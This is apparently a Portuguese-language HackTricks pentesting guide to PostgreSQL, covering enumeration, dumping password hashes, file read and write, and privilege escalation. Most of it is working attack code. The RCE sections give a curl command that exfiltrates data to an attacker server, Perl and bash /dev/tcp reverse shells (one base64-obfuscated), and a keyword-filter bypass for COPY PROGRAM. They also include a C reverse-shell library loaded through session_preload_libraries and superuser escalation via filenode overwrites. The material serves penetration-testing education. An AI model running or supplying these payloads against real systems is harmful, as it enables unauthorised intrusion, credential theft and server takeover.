# 5432,5433 - Pentesting Postgresql

{{#include ../banners/hacktricks-training.md}}

## **Informações Básicas**

**PostgreSQL** é descrito como um **sistema de banco de dados objeto-relacional** que é **código aberto**. Esse sistema não apenas utiliza a linguagem SQL, mas também a amplia com recursos adicionais. Suas capacidades permitem lidar com uma ampla variedade de tipos de dados e operações, tornando-o uma escolha versátil para desenvolvedores e organizações.

**Porta padrão:** 5432, e se essa porta já estiver em uso parece que postgresql usará a próxima porta (provavelmente 5433) que não estiver em uso.
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## Conexão & Basic Enum
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
> [!WARNING]
> Se ao executar **`\list`** você encontrar um banco de dados chamado **`rdsadmin`**, saiba que está dentro de um **AWS postgresql database**.

Para mais informações sobre **como abusar de um PostgreSQL database** confira:


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/
{{#endref}}

## Enumeração automática
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**Brute force**](../generic-hacking/brute-force.md#postgresql)

### **Port scanning**

De acordo com [**this research**](https://www.exploit-db.com/papers/13084), quando uma tentativa de conexão falha, `dblink` lança uma exceção `sqlclient_unable_to_establish_sqlconnection` incluindo uma explicação do erro. Exemplos desses detalhes estão listados abaixo.
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
- Host está indisponível

`DETAIL: could not connect to server: No route to host Is the server running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?`

- Port está fechado
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
- Porta está aberta
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
ou
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
- Porta está aberta ou filtrada
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
Em funções PL/pgSQL, atualmente não é possível obter detalhes de exceções. No entanto, se você tiver acesso direto ao servidor PostgreSQL, pode recuperar as informações necessárias. Se extrair nomes de usuário e senhas das tabelas do sistema não for viável, você pode considerar utilizar o wordlist attack method discutido na seção anterior, pois ele pode potencialmente trazer resultados positivos.

## Enumeração de Privilégios

### Roles

| Role Types     |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | Role tem privilégios de superuser                                                                                                                    |
| rolinherit     | Role herda automaticamente os privilégios das roles das quais é membro                                                                               |
| rolcreaterole  | Role pode criar mais roles                                                                                                                           |
| rolcreatedb    | Role pode criar bancos de dados                                                                                                                      |
| rolcanlogin    | Role pode fazer login. Ou seja, esta role pode ser usada como identificador inicial de autorização da sessão                                         |
| rolreplication | Role é uma replication role. Uma replication role pode iniciar conexões de replicação e criar e remover replication slots.                           |
| rolconnlimit   | Para roles que podem fazer login, define o número máximo de conexões simultâneas que essa role pode abrir. -1 significa sem limite.                  |
| rolpassword    | Não é a senha (sempre aparece como `********`)                                                                                                       |
| rolvaliduntil  | Hora de expiração da senha (usado somente para autenticação por senha); null se sem expiração                                                       |
| rolbypassrls   | Role contorna qualquer row-level security policy, veja [Section 5.8](https://www.postgresql.org/docs/current/ddl-rowsecurity.html) para mais informações. |
| rolconfig      | Defaults específicos da role para variáveis de configuração em tempo de execução                                                                    |
| oid            | ID da role                                                                                                                                           |

#### Grupos Interessantes

- Se você for membro de **`pg_execute_server_program`** você pode **executar** programas
- Se você for membro de **`pg_read_server_files`** você pode **ler** arquivos
- Se você for membro de **`pg_write_server_files`** você pode **escrever** arquivos

> [!TIP]
> Observe que no Postgres um **usuário**, um **grupo** e um **role** são o **mesmo**. Depende apenas de **como você o usa** e se você **permite que ele faça login**.
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### Tabelas
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### Funções
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## Ações no sistema de arquivos

### Ler diretórios e arquivos

A partir deste [**commit** ](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) membros do grupo definido **`DEFAULT_ROLE_READ_SERVER_FILES`** (chamado **`pg_read_server_files`**) e **super users** podem usar o método **`COPY`** em qualquer caminho (veja `convert_and_check_filename` em `genfile.c`):
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
> [!WARNING]
> Lembre-se de que, se você não for super user mas tiver a permissão **CREATEROLE**, você pode **tornar-se membro desse grupo:**
>
> ```sql
> GRANT pg_read_server_files TO username;
> ```
>
> [**Mais informações.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Existem **outras funções do postgres** que podem ser usadas para **ler arquivo ou listar um diretório**. Somente **superusers** e **usuários com permissões explícitas** podem usá-las:
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
Você pode encontrar **mais funções** em [https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html)

### Escrita Simples de Arquivos

Apenas **super users** e membros de **`pg_write_server_files`** podem usar copy para escrever arquivos.
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
> [!WARNING]
> Lembre-se que se você não for super user mas tiver a permissão **`CREATEROLE`** você pode **tornar-se membro desse grupo:**
>
> ```sql
> GRANT pg_write_server_files TO username;
> ```
>
> [**More info.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
>
> Lembre-se que COPY cannot handle newline chars, portanto mesmo se você estiver usando um payload base64 **você precisa enviar em uma única linha**.\
> Uma limitação muito importante desta técnica é que **`copy` não pode ser usado para escrever arquivos binários pois modifica alguns valores binários.**

### **Upload de arquivos binários**

No entanto, existem **outras técnicas para upload de arquivos binários grandes:**


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md
{{#endref}}



### Atualizando dados de tabelas do PostgreSQL via escrita local de arquivo

Se você tem as permissões necessárias para ler e escrever arquivos do servidor PostgreSQL, pode atualizar qualquer tabela no servidor sobrescrevendo o filenode associado no [the PostgreSQL data directory](https://www.postgresql.org/docs/8.1/storage.html). **More on this technique** [**here**](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users).

Passos necessários:

1.  Obter o diretório de dados do PostgreSQL

```sql
SELECT setting FROM pg_settings WHERE name = 'data_directory';
```

**Note:** Se você não conseguir recuperar o caminho atual do diretório de dados a partir das configurações, pode consultar a versão principal do PostgreSQL através da query `SELECT version()` e tentar brute-force no caminho. Caminhos comuns do diretório de dados em instalações Unix do PostgreSQL são `/var/lib/PostgreSQL/MAJOR_VERSION/CLUSTER_NAME/`. Um nome de cluster comum é `main`.

2.  Obter um caminho relativo para o filenode associado à tabela alvo

```sql
SELECT pg_relation_filepath('{TABLE_NAME}')
```

Essa query deve retornar algo como `base/3/1337`. O caminho completo no disco será `$DATA_DIRECTORY/base/3/1337`, por exemplo `/var/lib/postgresql/13/main/base/3/1337`.

3.  Baixar o filenode através das funções `lo_*`

```sql
SELECT lo_import('{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}',13337)
```

4.  Obter o datatype associado à tabela alvo

```sql
SELECT
STRING_AGG(
CONCAT_WS(
',',
attname,
typname,
attlen,
attalign
),
';'
)
FROM pg_attribute
JOIN pg_type
ON pg_attribute.atttypid = pg_type.oid
JOIN pg_class
ON pg_attribute.attrelid = pg_class.oid
WHERE pg_class.relname = '{TABLE_NAME}';
```

5.  Use o [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor) para [edit the filenode](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users); defina todas as flags booleanas `rol*` para 1 para permissões totais.

```bash
python3 postgresql_filenode_editor.py -f {FILENODE} --datatype-csv {DATATYPE_CSV_FROM_STEP_4} -m update -p 0 -i ITEM_ID --csv-data {CSV_DATA}
```

![Demonstração do PostgreSQL Filenode Editor](https://raw.githubusercontent.com/adeadfed/postgresql-filenode-editor/main/demo/demo_datatype.gif)

6.  Reenvie o filenode editado via as funções `lo_*`, e sobrescreva o arquivo original no disco

```sql
SELECT lo_from_bytea(13338,decode('{BASE64_ENCODED_EDITED_FILENODE}','base64'))
SELECT lo_export(13338,'{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}')
```

7.  _(Opcional)_ Limpe o cache de tabelas na memória executando uma consulta SQL custosa

```sql
SELECT lo_from_bytea(133337, (SELECT REPEAT('a', 128*1024*1024))::bytea)
```

8.  Agora você deve ver os valores da tabela atualizados no PostgreSQL.

Você também pode se tornar superadmin editando a tabela `pg_authid`. **See** [**the following section**](pentesting-postgresql.md#privesc-by-overwriting-internal-postgresql-tables).

## RCE

### **RCE para programas**

Since[ version 9.3](https://www.postgresql.org/docs/9.3/release-9-3.html), only **super users** and member of the group **`pg_execute_server_program`** can use copy for RCE (example with exfiltration:
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
Exemplo para executar:
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
> [!WARNING]
> Lembre-se que se você não for superusuário mas tiver a permissão **`CREATEROLE`** você pode **tornar-se membro desse grupo:**
>
> ```sql
> GRANT pg_execute_server_program TO username;
> ```
>
> [**Mais info.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Ou use o módulo `multi/postgres/postgres_copy_from_program_cmd_exec` do **metasploit**.\
Mais informações sobre essa vulnerabilidade [**aqui**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5). Enquanto foi reportada como CVE-2019-9193, Postgres declarou que isso era um [feature and will not be fixed](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/).

#### Contornar filtros de palavras-chave/WAF para alcançar COPY PROGRAM

Em contextos de SQLi com queries empilhadas, um WAF pode remover ou bloquear a palavra-chave literal `COPY`. Você pode construir dinamicamente a instrução e executá-la dentro de um bloco PL/pgSQL DO. Por exemplo, construa o C inicial com `CHR(67)` para contornar filtros ingênuos e EXECUTE o comando montado:
```sql
DO $$
DECLARE cmd text;
BEGIN
cmd := CHR(67) || 'OPY (SELECT '''') TO PROGRAM ''bash -c "bash -i >& /dev/tcp/10.10.14.8/443 0>&1"''';
EXECUTE cmd;
END $$;
```
This pattern avoids static keyword filtering and still achieves OS command execution via `COPY ... PROGRAM`. It is especially useful when the application echoes SQL errors and allows stacked queries.

### RCE com Linguagens do PostgreSQL


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md
{{#endref}}

### RCE com extensões do PostgreSQL

Once you have **learned** from the previous post **how to upload binary files** you could try obtain **RCE uploading a postgresql extension and loading it**.


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md
{{#endref}}

### RCE com arquivo de configuração do PostgreSQL

> [!TIP]
> Os vetores de RCE a seguir são especialmente úteis em contextos de SQLi restritos, pois todos os passos podem ser realizados através de SELECT aninhados

O **arquivo de configuração** do PostgreSQL é **gravável** pelo **usuário postgres**, que é quem executa o banco de dados, então como **superuser** você pode escrever arquivos no sistema de arquivos e, portanto, pode **sobrescrever este arquivo.**

![](<../images/image (322).png>)

#### **RCE com ssl_passphrase_command**

Mais informações [sobre esta técnica aqui](https://pulsesecurity.co.nz/articles/postgres-sqli).

O arquivo de configuração tem alguns atributos interessantes que podem levar a RCE:

- `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` Caminho para a chave privada do banco de dados
- `ssl_passphrase_command = ''` Se o arquivo privado estiver protegido por senha (criptografado) o PostgreSQL irá **executar o comando indicado neste atributo**.
- `ssl_passphrase_command_supports_reload = off` **Se** este atributo estiver **on** o **comando** executado se a chave estiver protegida por senha **será executado** quando `pg_reload_conf()` for **executado**.

Então, um atacante precisará:

1. **Extrair chave privada** do servidor
2. **Criptografar** a chave privada baixada:
1. `rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. **Sobrescrever**
4. **Extrair** a **configuração** atual do PostgreSQL
5. **Sobrescrever** a **configuração** com a configuração dos atributos mencionados:
1. `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
2. `ssl_passphrase_command_supports_reload = on`
6. Executar `pg_reload_conf()`

Durante os testes notei que isto só funciona se o **arquivo da chave privada tiver permissões 640**, for **de propriedade do root** e do **grupo ssl-cert ou postgres** (assim o usuário postgres pode lê-lo), e estiver localizado em _/var/lib/postgresql/12/main_.

#### **RCE com archive_command**

**Mais** [**informações sobre esta configuração e sobre WAL aqui**](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)**.**

Outro atributo no arquivo de configuração que é explorável é `archive_command`.

Para isso funcionar, a opção `archive_mode` tem de estar `'on'` ou `'always'`. Se for o caso, podemos sobrescrever o comando em `archive_command` e forçá-lo a executar via operações WAL (write-ahead logging).

Os passos gerais são:

1. Verificar se archive_mode está habilitado: `SELECT current_setting('archive_mode')`
2. Sobrescrever `archive_command` com o payload. Por exemplo, um reverse shell: `archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. Recarregar a config: `SELECT pg_reload_conf()`
4. Forçar a operação WAL a rodar, o que chamará o archive_command: `SELECT pg_switch_wal()` ou `SELECT pg_switch_xlog()` em algumas versões do Postgres

##### Editando postgresql.conf via Large Objects (compatível com SQLi)

Quando são necessárias escritas multi-linha (por exemplo, para definir múltiplos GUCs), use PostgreSQL Large Objects para ler e sobrescrever a configuração inteiramente via SQL. Esta abordagem é ideal em contextos SQLi onde `COPY` não consegue lidar com quebras de linha ou escritas seguras para binários.

Exemplo (ajuste a versão principal e o caminho se necessário, por exemplo, versão 15 no Debian):
```sql
-- 1) Import the current configuration and note the returned OID (example OID: 114575)
SELECT lo_import('/etc/postgresql/15/main/postgresql.conf');

-- 2) Read it back as text to verify
SELECT encode(lo_get(114575), 'escape');

-- 3) Prepare a minimal config snippet locally that forces execution via WAL
--    and base64-encode its contents, for example:
--    archive_mode = 'always'\n
--    archive_command = 'bash -c "bash -i >& /dev/tcp/10.10.14.8/443 0>&1"'\n
--    archive_timeout = 1\n
--    Then write the new contents into a new Large Object and export it over the original file
SELECT lo_from_bytea(223, decode('<BASE64_POSTGRESQL_CONF>', 'base64'));
SELECT lo_export(223, '/etc/postgresql/15/main/postgresql.conf');

-- 4) Reload the configuration and optionally trigger a WAL switch
SELECT pg_reload_conf();
-- Optional explicit trigger if needed
SELECT pg_switch_wal();  -- or pg_switch_xlog() on older versions
```
Isso produz execução confiável de comandos do SO via `archive_command` como o usuário `postgres`, desde que `archive_mode` esteja habilitado. Na prática, definir um `archive_timeout` baixo pode causar invocações rápidas sem exigir um switch explícito do WAL.

#### **RCE com bibliotecas pré-carregadas**

More information [about this technique here](https://adeadfed.com/posts/postgresql-select-only-rce/).

Este vetor de ataque explora as seguintes variáveis de configuração:

- `session_preload_libraries` -- bibliotecas que serão carregadas pelo servidor PostgreSQL na conexão do cliente.
- `dynamic_library_path` -- lista de diretórios onde o servidor PostgreSQL irá procurar pelas bibliotecas.

Podemos definir o valor de `dynamic_library_path` para um diretório gravável pelo usuário `postgres` que executa o banco de dados, por exemplo o diretório `/tmp/`, e enviar um objeto `.so` malicioso para lá. Em seguida, forçaremos o servidor PostgreSQL a carregar nossa biblioteca recém-enviada incluindo-a na variável `session_preload_libraries`.

Os passos do ataque são:

1. Baixar o `postgresql.conf` original
2. Incluir o diretório `/tmp/` no valor de `dynamic_library_path`, ex.: `dynamic_library_path = '/tmp:$libdir'`
3. Incluir o nome da biblioteca maliciosa no valor de `session_preload_libraries`, ex.: `session_preload_libraries = 'payload.so'`
4. Verificar a versão principal do PostgreSQL com a query `SELECT version()`
5. Compilar o código da biblioteca maliciosa com o pacote de desenvolvimento correto do PostgreSQL. Código de exemplo:

```c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

void _init() {
/*
code taken from https://www.revshells.com/
*/

int port = REVSHELL_PORT;
struct sockaddr_in revsockaddr;

int sockt = socket(AF_INET, SOCK_STREAM, 0);
revsockaddr.sin_family = AF_INET;
revsockaddr.sin_port = htons(port);
revsockaddr.sin_addr.s_addr = inet_addr("REVSHELL_IP");

connect(sockt, (struct sockaddr *) &revsockaddr,
sizeof(revsockaddr));
dup2(sockt, 0);
dup2(sockt, 1);
dup2(sockt, 2);

char * const argv[] = {"/bin/bash", NULL};
execve("/bin/bash", argv, NULL);
}
```

Compilando o código:

```bash
gcc -I$(pg_config --includedir-server) -shared -fPIC -nostartfiles -o payload.so payload.c
```

6. Fazer upload do `postgresql.conf` malicioso, criado nos passos 2-3, e sobrescrever o original
7. Fazer upload do `payload.so` do passo 5 para o diretório `/tmp`
8. Recarregar a configuração do servidor reiniciando-o ou invocando a query `SELECT pg_reload_conf()`
9. Na próxima conexão ao DB, você receberá a conexão de reverse shell.

## **Postgres Privesc**

### CREATEROLE Privesc

#### **Grant**

According to the [**docs**](https://www.postgresql.org/docs/13/sql-grant.html): _Roles having **`CREATEROLE`** privilege can **grant or revoke membership in any role** that is **not** a **superuser**._

Então, se você tem permissão **`CREATEROLE`**, você poderia se conceder acesso a outras **roles** (que não sejam superuser) que podem te dar a opção de ler e gravar arquivos e executar comandos:
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### Modificar Senha

Usuários com essa função também podem **alterar** as **senhas** de outros **usuários que não são superusuários**:
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### Privesc para SUPERUSER

É bastante comum encontrar que **usuários locais podem fazer login no PostgreSQL sem fornecer nenhuma senha**. Portanto, uma vez que você tenha obtido **permissões para executar código**, você pode abusar dessas permissões para conceder a si mesmo a role **`SUPERUSER`**:
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
> [!TIP]
> Isto geralmente é possível por causa das seguintes linhas no arquivo **`pg_hba.conf`**:
>
> ```bash
> # "local" is for Unix domain socket connections only
> local   all             all                                     trust
> # IPv4 local connections:
> host    all             all             127.0.0.1/32            trust
> # IPv6 local connections:
> host    all             all             ::1/128                 trust
> ```

### **ALTER TABLE privesc**

Em [**this writeup**](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities) é explicado como foi possível **privesc** no Postgres GCP abusando do privilégio ALTER TABLE que foi concedido ao usuário.

Quando você tenta **make another user owner of a table** você deveria receber um **error** impedindo isso, mas aparentemente o GCP deu essa **option** ao usuário **postgres** que não é superuser no GCP:

<figure><img src="../images/image (537).png" alt=""><figcaption></figcaption></figure>

Unindo essa ideia ao fato de que, quando os **INSERT/UPDATE/**[**ANALYZE**](https://www.postgresql.org/docs/13/sql-analyze.html) comandos são executados em uma **table with an index function**, a **function** é **called** como parte do comando com as **table** **owner’s permissions**. É possível criar um índice com uma função e dar owner permissions a um **super user** sobre essa tabela, e então executar ANALYZE sobre a tabela com a função maliciosa que será capaz de executar comandos porque está usando os privilégios do owner.
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### Exploração

1. Comece criando uma nova tabela.
2. Insira algum conteúdo irrelevante na tabela para fornecer dados para a função de índice.
3. Desenvolva uma função de índice maliciosa que contenha um payload de execução de código, permitindo que comandos não autorizados sejam executados.
4. ALTER o proprietário da tabela para "cloudsqladmin", que é o papel de superuser do GCP usado exclusivamente pelo Cloud SQL para gerenciar e manter o banco de dados.
5. Execute uma operação ANALYZE na tabela. Essa ação força o engine PostgreSQL a mudar para o contexto do usuário do proprietário da tabela, "cloudsqladmin". Consequentemente, a função de índice maliciosa é chamada com as permissões de "cloudsqladmin", permitindo assim a execução do comando de shell anteriormente não autorizado.

Em PostgreSQL, esse fluxo fica mais ou menos assim:
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
Então, a tabela `shell_commands_results` conterá a saída do código executado:
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### Login Local

Algumas instâncias postgresql mal configuradas podem permitir o login de qualquer usuário local; é possível fazer login a partir de 127.0.0.1 usando a função **`dblink`**:
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
> [!WARNING]
> Observe que para a consulta anterior funcionar **a função `dblink` precisa existir**. Se não existir, você pode tentar criá-la com
>
> ```sql
> CREATE EXTENSION dblink;
> ```

Se você tiver a senha de um usuário com mais privilégios, mas o usuário não estiver autorizado a fazer login a partir de um IP externo, você pode usar a seguinte função para executar consultas como esse usuário:
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
É possível verificar se essa função existe com:
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### **Função definida customizada com** SECURITY DEFINER

[**In this writeup**](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql), pentesters were able to privesc inside a postgres instance provided by IBM, because they **found this function with the SECURITY DEFINER flag**:

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
…
</code></pre>

Como [**explicado na docs**](https://www.postgresql.org/docs/current/sql-createfunction.html) uma função com **SECURITY DEFINER é executada** com os privilégios do **usuário que a possui**. Portanto, se a função for **vulnerável a SQL Injection** ou estiver realizando ações **privilegiadas com parâmetros controlados pelo atacante**, ela pode ser abusada para **escalar privilégios dentro do postgres**.

Na linha 4 do código anterior você pode ver que a função tem a flag **SECURITY DEFINER**.
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
E então **execute comandos**:

<figure><img src="../images/image (649).png" alt=""><figcaption></figcaption></figure>

### Pass Burteforce com PL/pgSQL

**PL/pgSQL** é uma **linguagem de programação completa** que oferece maior controle procedimental em comparação com SQL. Ela permite o uso de **loops** e outras **estruturas de controle** para aprimorar a lógica do programa. Além disso, **SQL statements** e **triggers** têm a capacidade de invocar funções criadas usando a **linguagem PL/pgSQL**. Essa integração permite uma abordagem mais abrangente e versátil para programação e automação de banco de dados.\
**Você pode abusar desta linguagem para solicitar ao PostgreSQL que faça brute-force nas credenciais dos usuários.**


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md
{{#endref}}

### Privesc sobrescrevendo as tabelas internas do PostgreSQL

> [!TIP]
> O seguinte vetor de privesc é especialmente útil em contextos de SQLi restritos, pois todos os passos podem ser realizados através de SELECTs aninhados

Se você pode **ler e escrever arquivos do servidor PostgreSQL**, você pode **se tornar um superuser** sobrescrevendo o filenode no disco do PostgreSQL, associado à tabela interna `pg_authid`.

Leia mais sobre **esta técnica** [**aqui**](https://adeadfed.com/posts/updating-postgresql-data-without-update/)**.**

Os passos do ataque são:

1. Obter o diretório de dados do PostgreSQL
2. Obter um caminho relativo para o filenode, associado à tabela `pg_authid`
3. Baixar o filenode através das funções `lo_*`
4. Obter o datatype associado à tabela `pg_authid`
5. Use o [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor) para [editar o filenode](https://adeadfed.com/posts/updating-postgresql-data-without-update/#privesc-updating-pg_authid-table); defina todas as flags booleanas `rol*` para 1 para permissões totais.
6. Recarregue o filenode editado via as funções `lo_*`, e sobrescreva o arquivo original no disco
7. _(Opcional)_ Limpe o cache de tabelas em memória executando uma consulta SQL custosa
8. Agora você deve ter os privilégios de um superadmin completo.

